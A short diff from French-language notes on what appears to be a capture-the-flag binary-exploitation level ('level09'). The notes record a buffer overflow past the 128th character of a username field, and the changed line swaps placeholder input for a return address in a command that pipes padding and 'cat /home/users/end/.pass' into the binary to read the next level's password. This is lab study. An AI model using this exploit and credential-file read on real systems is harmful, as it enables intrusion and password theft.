@@ -72,4 +72,4 @@ ecrit de ref à ref + 180 ?
 
 dépasse sur message au 128 eme char dans username
 final string : 
-(python -c 'print("a" * 120 + "")' ; python -c 'print("hhshs")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
+(python -c 'print("a" * 120 + "")' ; python -c 'print("0x000055555555488c")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
